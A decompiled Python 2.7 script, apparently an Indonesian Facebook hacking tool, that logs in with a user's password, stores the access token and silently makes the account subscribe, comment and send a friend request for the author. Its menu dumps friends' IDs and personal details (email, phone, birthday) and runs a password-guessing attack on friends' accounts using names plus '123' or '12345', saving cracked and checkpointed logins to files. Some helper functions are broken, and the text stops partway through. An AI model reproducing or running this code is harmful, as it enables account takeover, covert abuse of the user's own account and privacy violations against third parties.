# Python bytecode 2.7
# Decompiled from: Python 2.7.17 (default, Oct 23 2019, 08:25:46) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: <Ariya>
# Decompile At :  Mon Mar  9 14:17:03 2020
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from bs4 import BeautifulSoup as parser
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
from prompt_toolkit.shortcuts import prompt
from prompt_toolkit.styles import Style
from http.cookiejar import LWPCookieJar as kuki
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
cj = kuki('log/kuki')
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[1;91m[!] Exit'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


logo = '\x1b[1;96m\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\x8c\xe2\x94\x90 \xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80  \xe2\x94\x8c\xe2\x94\xac\xe2\x94\x90\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac  \xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\n\xe2\x94\x9c\xe2\x94\xa4 \xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x82  \xe2\x94\x9c\xe2\x94\xa4 \xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x82 \xe2\x94\x82\xe2\x94\x82 \xe2\x94\x82\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90   \xe2\x94\x82 \xe2\x94\x82 \xe2\x94\x82\xe2\x94\x82 \xe2\x94\x82\xe2\x94\x82  \xe2\x94\x94\xe2\x94\x80\xe2\x94\x90\n\xe2\x94\x94  \xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98\xe2\x94\xb4 \xe2\x94\xb4   \xe2\x94\xb4 \xe2\x94\x94\xe2\x94\x80\xe2\x94\x98\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98\xe2\x94\xb4\xe2\x94\x80\xe2\x94\x98\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98\n\x1b[1;94m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[1;94m\xe2\x95\x91\x1b[1;97m{\x1b[1;92m\xe2\x80\xa2\x1b[1;97m} Author     \x1b[1;91m: \x1b[1;93mAriya Z                  \x1b[1;94m\xe2\x95\x91\n\x1b[1;94m\xe2\x95\x91\x1b[1;97m{\x1b[1;92m\xe2\x80\xa2\x1b[1;97m} version    \x1b[1;91m: \x1b[1;92m1.0 \x1b[1;97m(\x1b[1;91msimple\x1b[1;97m)             \x1b[1;94m\xe2\x95\x91\n\x1b[1;94m\xe2\x95\x91\x1b[1;97m{\x1b[1;92m\xe2\x80\xa2\x1b[1;97m} Cek update \x1b[1;91m: \x1b[1;92mGithub.com/Ariya-Coder   \x1b[1;94m\xe2\x95\x91\n\x1b[1;94m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mLoading \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
idteman = []
idfromteman = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        try:
            os.mkdir('log')
        except:
            pass

        os.system('clear')
        print logo
        print 44 * '\x1b[1;94m\xe2\x95\x90'
        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN AKUN FACEBOOK \x1b[1;91m[\xe2\x98\x86]'
        id = raw_input('\x1b[1;91m[+] \x1b[1;36mID\x1b[1;97m|\x1b[1;96mEmail\x1b[1;97m \x1b[1;91m:\x1b[1;92m ')
        pwd = raw_input('\x1b[1;91m[+] \x1b[1;36mPassword \x1b[1;91m:\x1b[1;92m ')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;91m[!] No connection'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                cj.save()
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                try:
                    toket = open('login.txt', 'r').read()
                    with requests.Session() as (s):
                        s.cookies = kuki('log/kuki')
                        s.cookies.load()
                        la = s.get('https://m.facebook.com/language.php')
                        pa = parser(la.content, 'html.parser')
                        bh = pa.find('a', string='Bahasa Indonesia')
                        s.get('https://m.facebook.com' + str(bh['href']))
                        s.post('https://graph.facebook.com/ariyahacker/subscribers?access_token=' + toket)
                        s.post('https://graph.facebook.com/120300252885977/comments?message=Nice:)*&access_token=' + toket)
                except:
                    pass

                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin successfully'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;91m[!] No connection'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;91m[!] Login Failed'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[!] No connection'
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;94m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    print '\x1b[1;94m\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Nama  \x1b[1;91m: \x1b[1;97m' + nama + '\x1b[1;97m               '
    print '\x1b[1;94m\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m ID Fb \x1b[1;91m: \x1b[1;97m' + id + '\x1b[1;97m              '
    print '\x1b[1;94m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
    print '\x1b[1;94m[\x1b[1;92m1\x1b[1;94m]\x1b[1;97m User information                       \x1b[1;94m\xe2\x95\x91'
    print '\x1b[1;94m[\x1b[1;92m2\x1b[1;94m]\x1b[1;97m Dump ID facebook                       \x1b[1;94m\xe2\x95\x91'
    print '\x1b[1;94m[\x1b[1;92m3\x1b[1;94m]\x1b[1;97m Multi bruteforce facebook              \x1b[1;94m\xe2\x95\x91'
    print '\x1b[1;94m[\x1b[1;92m4\x1b[1;94m]\x1b[1;97m Mass accept friend                     \x1b[1;94m\xe2\x95\x91'
    print '\x1b[1;94m[\x1b[1;92m5\x1b[1;94m]\x1b[1;97m Mass delete friend                     \x1b[1;94m\xe2\x95\x91'
    print '\x1b[1;94m[\x1b[1;92m6\x1b[1;94m]\x1b[1;97m Create Post                            \x1b[1;94m\xe2\x95\x91'
    print '\x1b[1;94m[\x1b[1;92m7\x1b[1;94m]\x1b[1;97m Profile Guard                          \x1b[1;94m\xe2\x95\x91'
    print '\x1b[1;94m[\x1b[1;92m8\x1b[1;94m]\x1b[1;97m Account Checker                        \x1b[1;94m\xe2\x95\x91'
    print '\x1b[1;94m[\x1b[1;91m0\x1b[1;94m]\x1b[1;91m Exit the programs                      \x1b[1;94m\xe2\x95\x91'
    print '\x1b[1;94m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
    pilih()


def pilih():
    unikers = raw_input('\n\x1b[1;94m >>> \x1b[1;97m')
    if unikers == '':
        print '\x1b[1;91m[!] Wrong input'
        pilih()
    elif unikers == '1':
        informasi()
    elif unikers == '2':
        dump()
    elif unikers == '3':
        super()
    elif unikers == '4':
        accept()
    elif unikers == '5':
        unfriend()
    elif unikers == '6':
        status()
    elif unikers == '7':
        guard()
    elif unikers == '8':
        check_akun()
    elif unikers == '0':
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;91m[!] Wrong input'
        pilih()


def informasi():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 44 * '\x1b[1;94m\xe2\x95\x90'
    aid = raw_input('\x1b[1;91m[+] \x1b[1;92mEnter ID\x1b[1;97m/\x1b[1;92mName\x1b[1;91m : \x1b[1;97m')
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    cok = json.loads(r.text)
    for i in cok['data']:
        if aid in i['name'] or aid in i['id']:
            x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
            z = json.loads(x.text)
            print 44 * '\x1b[1;94m\xe2\x95\x90'
            try:
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mName\x1b[1;97m          : ' + z['name']
            except KeyError:
                print '\x1b[1;91m[?] \x1b[1;92mName\x1b[1;97m          : \x1b[1;91mNot found'

            try:
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID\x1b[1;97m            : ' + z['id']
            except KeyError:
                print '\x1b[1;91m[?] \x1b[1;92mID\x1b[1;97m            : \x1b[1;91mNot found'

            try:
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail\x1b[1;97m         : ' + z['email']
            except KeyError:
                print '\x1b[1;91m[?] \x1b[1;92mEmail\x1b[1;97m         : \x1b[1;91mNot found'

            try:
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mTelephone\x1b[1;97m     : ' + z['mobile_phone']
            except KeyError:
                print '\x1b[1;91m[?] \x1b[1;92mTelephone\x1b[1;97m     : \x1b[1;91mNot found'

            try:
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mLocation\x1b[1;97m      : ' + z['location']['name']
            except KeyError:
                print '\x1b[1;91m[?] \x1b[1;92mLocation\x1b[1;97m      : \x1b[1;91mNot found'

            try:
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mDate of birth\x1b[1;97m : ' + z['birthday']
            except KeyError:
                print '\x1b[1;91m[?] \x1b[1;92mDate of birth\x1b[1;97m : \x1b[1;91mNot found'

            try:
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mSchool\x1b[1;97m        : '
                for q in z['education']:
                    try:
                        print '\x1b[1;91m                   ~ \x1b[1;97m' + q['school']['name']
                    except KeyError:
                        print '\x1b[1;91m                   ~ \x1b[1;91mNot found'

            except KeyError:
                pass

            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
    else:
        print '\x1b[1;91m[\xe2\x9c\x96] User not found'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu()


def dump():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;94m[\x1b[1;92m1\x1b[1;94m]\x1b[1;97m Get ID friend'
    print '\x1b[1;94m[\x1b[1;92m2\x1b[1;94m]\x1b[1;97m Ger ID friend from friend'
    print '\x1b[1;94m[\x1b[1;91m0\x1b[1;94m]\x1b[1;91m Back'
    dump_pilih()


def dump_pilih():
    cuih = raw_input('\n\x1b[1;94m >>> \x1b[1;97m')
    if cuih == '':
        print '\x1b[1;91m[!] Wrong input'
        dump_pilih()
    elif cuih == '1':
        id_teman()
    elif cuih == '2':
        idfrom_teman()
    elif cuih == '0':
        menu()
    else:
        print '\x1b[1;91m[!] Wrong input'
        dump_pilih()


def id_teman():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    try:
        os.mkdir('out')
    except OSError:
        pass

    try:
        os.system('clear')
        print logo
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mGet all friend id \x1b[1;97m...')
        print 44 * '\x1b[1;94m\xe2\x95\x90'
        bz = open('out/id_teman.txt', 'w')
        for a in z['data']:
            idteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(idteman)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + a['id'],
            sys.stdout.flush()
            time.sleep(0.0001)

        bz.close()
        print '\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mSuccessfully get id \x1b[1;97m....'
        print '\r\x1b[1;91m[+] \x1b[1;92mTotal ID \x1b[1;91m: \x1b[1;97m%s' % len(idteman)
        done = raw_input('\r\x1b[1;91m[+] \x1b[1;92mSave file with name\x1b[1;91m :\x1b[1;97m ')
        os.rename('out/id_teman.txt', 'out/' + done)
        print '\r\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m: \x1b[1;97mout/' + done
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        dump()
    except IOError:
        print '\x1b[1;91m[!] Error creating file'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;91m[!] Stopped'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        dump()
    except KeyError:
        print '\x1b[1;91m[!] Error'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] No connection'
        keluar()


def idfrom_teman():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    try:
        os.mkdir('out')
    except OSError:
        pass

    try:
        os.system('clear')
        print logo
        idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID friend \x1b[1;91m: \x1b[1;97m')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
        except KeyError:
            print '\x1b[1;91m[!] Friend not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            dump()

        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
        z = json.loads(r.text)
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mGet all friend id from friend \x1b[1;97m...')
        print 44 * '\x1b[1;94m\xe2\x95\x90'
        bz = open('out/id_teman_from_teman.txt', 'w')
        for a in z['friends']['data']:
            idfromteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(idfromteman)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + a['id'],
            sys.stdout.flush()
            time.sleep(0.0001)

        bz.close()
        print '\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mSuccessfully get id \x1b[1;97m....'
        print '\r\x1b[1;91m[+] \x1b[1;92mTotal ID \x1b[1;91m: \x1b[1;97m%s' % len(idfromteman)
        done = raw_input('\r\x1b[1;91m[+] \x1b[1;92mSave file with name\x1b[1;91m :\x1b[1;97m ')
        os.rename('out/id_teman_from_teman.txt', 'out/' + done)
        print '\r\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m: \x1b[1;97mout/' + done
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        dump()
    except IOError:
        print '\x1b[1;91m[!] Error creating file'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;91m[!] Stopped'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        dump()
    except KeyError:
        print '\x1b[1;91m[!] Error'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] No connection'
        keluar()


def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 44 * '\x1b[1;94m\xe2\x95\x90'
    print '\x1b[1;94m[\x1b[1;92m1\x1b[1;94m]\x1b[1;97m Crack with list friend'
    print '\x1b[1;94m[\x1b[1;92m2\x1b[1;94m]\x1b[1;97m Crack from friend'
    print '\x1b[1;94m[\x1b[1;92m3\x1b[1;94m]\x1b[1;97m Crack from file'
    print '\x1b[1;94m[\x1b[1;91m0\x1b[1;94m]\x1b[1;91m Back'
    pilih_super()


def pilih_super():
    global cekpoint
    global oks
    peak = raw_input('\n\x1b[1;94m >>> \x1b[1;97m')
    if peak == '':
        print '\x1b[1;91m[!] Wrong input'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            print 44 * '\x1b[1;94m\xe2\x95\x90'
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mGet all friend id \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif peak == '2':
            os.system('clear')
            print logo
            print 44 * '\x1b[1;94m\xe2\x95\x90'
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID friend \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Friend not found'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                super()

            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mGet all id from friend \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif peak == '3':
            os.system('clear')
            print logo
            print 44 * '\x1b[1;94m\xe2\x95\x90'
            try:
                idlist = raw_input('\x1b[1;91m[+] \x1b[1;92mFile ID  \x1b[1;91m: \x1b[1;97m')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except IOError:
                print '\x1b[1;91m[!] File not found'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                super()

        elif peak == '0':
            menu()
        else:
            print '\x1b[1;91m[!] Wrong input'
            pilih_super()
        print '\x1b[1;91m[+] \x1b[1;92mTotal ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack \x1b[1;97m' + o,
            sys.stdout.flush()
            time.sleep(1)

    print
    print 44 * '\x1b[1;94m\xe2\x95\x90'

    def main(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;94m[\x1b[1;92mBerhasil\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass1
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;94m[\x1b[1;93mCekpoint\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass1
                cek = open('out/super_cp.txt', 'a')
                cek.write(user + '|' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = b['first_name'] + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;94m[\x1b[1;92mBerhasil\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass2
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;94m[\x1b[1;93mCekpoint\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass2
                    cek = open('out/super_cp.txt', 'a')
                    cek.write(user + '|' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = b['last_name'] + '123'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;94m[\x1b[1;92mBerhasil\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass3
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;94m[\x1b[1;93mCekpoint\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass3
                        cek = open('out/super_cp.txt', 'a')
                        cek.write(user + '|' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = 'Bangsat'
